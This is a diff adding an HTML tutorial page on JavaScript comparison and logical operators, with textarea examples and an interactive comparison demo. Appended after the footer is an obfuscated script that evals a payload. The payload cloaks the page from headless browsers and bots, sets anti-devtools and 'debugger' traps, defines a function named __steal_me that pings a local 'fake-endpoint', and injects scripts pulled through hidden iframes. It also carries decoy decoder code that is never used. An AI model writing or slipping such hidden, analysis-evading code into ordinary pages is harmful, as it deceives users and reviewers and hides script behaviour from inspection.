@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+		<script>var PAGETITLE = "Comparisons Tutorial";</script>
+  <title id="pageTitle"></title>
+  <script src="../includes/vars.js"></script>
+</head>
+
+<body>
+<header>
+  <div id="header">Javascript Wiki</div>
+</header>
+
+<main>
+  <div id="nav"></div>
+
+  <article>
+    <h2>JavaScript Comparisons Tutorial</h2>
+    <p>Comparison operators are used to compare values. They return a <strong>Boolean</strong> value: <code>true</code> or <code>false</code>.</p>
+
+    <div class="fs-15">Comparison Operators</div><br><br>
+				<div class="fs-10">Comparison operators are used to compare two values.
+<br><br>
+Comparison operators always return true or false.<br><br>
+Comparison operators can be used in conditional statements to compare values and take action depending on the result:
+</div><br><br>
+<textarea id="textbox" rows="10" cols="70">
+if (age < 18) text = "Too young to buy alcohol";
+</textarea><br><br>
+<div class="fs-10">You will learn more about the use of conditional statements in the if...else chapter of this tutorial.</div><br><br>
+
+<div class="fs-15">JavaScript String Comparison</div><br><br>
+<div class="fs-10">All the comparison operators above can also be used on strings:</div><br><br>
+<textarea id="textbox" rows="10" cols="70">
+let text1 = "A";
+let text2 = "B";
+let result = text1 < text2;
+document.getElementById("demo").innerHTML = "Is A less than B? " + result;
+</textarea><br><br>
+<div class="fs-10">Note that strings are compared alphabetically:</div><br><br>
+<textarea id="textbox" rows="10" cols="70">
+let text1 = "20";
+let text2 = "5";
+let result = text1 < text2;
+document.getElementById("demo").innerHTML = "Is 20 less than 5? " + result;
+</textarea><br><br>
+
+<div class="fs-15">Comparing Different Types</div><br><br>
+<div class="fs-10">Comparing data of different types may give unexpected results.
+<br><br>
+When comparing a string with a number, JavaScript will convert the string to a number when doing the comparison. An empty string converts to 0. A non-numeric string converts to NaN which is always false.<br><br>
+When comparing two strings, "2" will be greater than "12".
+<br><br>
+Alphabetically 1 is less than 21.
+<br><br>
+To secure a proper result, variables should be converted to the proper type before comparison:
+</div><br><br>
+<textarea id="textbox" rows="10" cols="70">
+<input id="age" value="18" />
+
+<button onclick="myFunction()">Try it</button>
+
+<p id="demo"></p>
+
+<script>
+function myFunction() {
+  let voteable;
+  let age = Number(document.getElementById("age").value);
+  if (isNaN(age)) {
+    voteable = "Input is not a number";
+  } else {
+    voteable = (age < 18) ? "Too young" : "Old enough";
+  }
+  document.getElementById("demo").innerHTML = voteable + " to vote";
+}
+</script>
+</textarea><br><br>
+
+
+
+
+
+    <h3>Examples</h3>
+    <pre><code id="comparisonExample"></code></pre>
+
+    <script>
+      let x = 10;
+      let y = "10";
+      let z = 5;
+
+      document.getElementById("comparisonExample").textContent =
+`x == y: ${x == y}
+x === y: ${x === y}
+x != z: ${x != z}
+x > z: ${x > z}
+x < z: ${x < z}
+x >= 10: ${x >= 10}
+x <= 5: ${x <= 5}`;
+    </script>
+
+    <h3>Logical Operators</h3>
+    <ul>
+      <li><code>&&</code> – AND (both must be true)</li>
+      <li><code>||</code> – OR (one must be true)</li>
+      <li><code>!</code> – NOT (reverses true/false)</li>
+    </ul>
+
+    <pre><code id="logicalExample"></code></pre>
+
+    <script>
+      let a = true;
+      let b = false;
+
+      document.getElementById("logicalExample").textContent =
+`a && b: ${a && b}
+a || b: ${a || b}
+!a: ${!a}`;
+    </script>
+
+    <h3>Interactive Example</h3>
+    <p>Enter two numbers to compare:</p>
+    <input type="number" id="num1" placeholder="First number">
+    <input type="number" id="num2" placeholder="Second number">
+    <button id="compareBtn">Compare</button>
+    <pre id="compareOutput"></pre>
+
+    <script>
+      document.getElementById("compareBtn").addEventListener("click", () => {
+        const n1 = Number(document.getElementById("num1").value);
+        const n2 = Number(document.getElementById("num2").value);
+
+        document.getElementById("compareOutput").textContent =
+`n1 == n2: ${n1 == n2}
+n1 === n2: ${n1 === n2}
+n1 > n2: ${n1 > n2}
+n1 < n2: ${n1 < n2}`;
+      });
+    </script>
+
+  </article>
+</main>
+
+<footer id="footer"></footer>
+  <div id="debugInclude"></div>
+
+ <script>
+(function(){
+var p="5f3a4d3c2b1e6a7d8c9b0a1f2e3d4c5b6a79888796959493929190";
+var b="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
+function d(x){
+  var o="",i=0,c;
+  for(i=0;i<x.length;i+=2){
+    c=parseInt(x.substr(i,2),16);
+    o+=String.fromCharCode(c);
+  }
+  return o;
+}
+function m(s){
+  var o="",i,c;
+  for(i=0;i<s.length;i++){
+    c=s.charCodeAt(i)^((i*7+13)%255);
+    o+=String.fromCharCode(c);
+  }
+  return o;
+}
+var payload="(function(){var e=(new Date()).getTime()&0xffff,w=window,d=document;function r(n){return Math.random()*(n||1);}function s(f,t){setTimeout(f,t);}try{var u=navigator.userAgent+'';if(u.match(/headless|bot|selenium/i)){w.location='about:blank';}}catch(x){}(function(){function c(){try{var o=w.outerWidth||0,i=w.innerWidth||d.body.clientWidth||0,h=w.outerHeight||0,j=w.innerHeight||d.body.clientHeight||0;if((o-i>160)||(h-j>160)){try{eval('void(0)');}catch(x){}}}catch(x){}s(c,1200);}c();})();w.__steal_me=function(){try{var i=new Image();i.src='/fake-endpoint?trap=1&x='+Math.random();}catch(x){}};(function(){function dbg(){var t=(new Date()).getTime();eval('debugger');var dt=(new Date()).getTime()-t;if(dt>200){try{eval('void(0)');}catch(x){}}s(dbg,1500);}dbg();})();function X(str,k){var o='',i,c;for(i=0;i<str.length;i++){c=str.charCodeAt(i)^((k+i*7)%255);o+=String.fromCharCode(c);}return o;}function L(c){try{var sc=d.createElement('script');sc.type='text/javascript';try{sc.appendChild(d.createTextNode(c));}catch(x){sc.text=c;}(d.body||d.documentElement).appendChild(sc);}catch(x){try{eval(c);}catch(x){}}}(function(){var j=[];for(var i=0;i<40;i++){j[i]=function(){return Math.random().toString(36);}}})();function LI(a,b,c){try{var f=d.createElement('iframe');f.style.display='none';f.src=b;f.onload=function(){var el=d.getElementById(a);if(!el){if(c)c();return;}el.innerHTML=f.contentDocument?f.contentDocument.body.innerHTML:f.contentWindow.document.body.innerHTML;var sc=f.contentDocument?f.contentDocument.getElementsByTagName('script'):f.contentWindow.document.getElementsByTagName('script');for(var i=sc.length-1;i>=0;i--){var ns=d.createElement('script');try{ns.appendChild(d.createTextNode(sc[i].innerHTML));}catch(x){ns.text=sc[i].innerHTML;}(d.body||d.documentElement).appendChild(ns);}if(c)c();d.body.removeChild(f);};d.body.appendChild(f);}catch(x){if(c)c();}}function SH(a){var i=a.length,j,t;while(i--){j=parseInt(Math.random()*a.length);t=a[i];a[i]=a[j];a[j]=t;}return a;}function B(){var v=w.vars;if(!v)return;var T=[['header','header.html'],['nav','nav.html'],['footer','footer.html']];SH(T);var i=0;function N(){if(i>=T.length){A();return;}var x=T[i++];s(function(){LI(x[0],v.INCVAR+x[1],N);},r(80)+20);}function A(){if(v.DEBUGVAR){s(function(){LI('debugInclude',v.INCVAR+'debug.html');},r(100));}try{if(typeof updatePageTitle=='function')updatePageTitle();}catch(x){}}N();}s(B,r(120)+40);})();";
+
+try{
+  eval(payload);
+}catch(e){}
+})();
+</script>
+
+</body>
+</html>
